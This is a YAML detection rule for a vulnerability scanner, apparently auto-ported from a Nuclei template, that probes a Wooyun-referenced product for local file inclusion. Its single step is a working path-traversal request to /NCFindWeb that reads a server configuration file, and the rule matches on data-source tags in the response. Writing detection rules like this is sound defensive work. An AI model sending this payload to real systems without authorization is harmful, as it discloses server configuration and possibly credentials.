schema_version: 1
id: "cortex.community:wooyun-path-traversal"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Wooyun - Local File Inclusion"
  description: "Wooyun is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html"
  cwes: [23]
  tags: ["lfi", "wooyun", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<DataSourceClassName>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "</DataSourceClassName>" } }
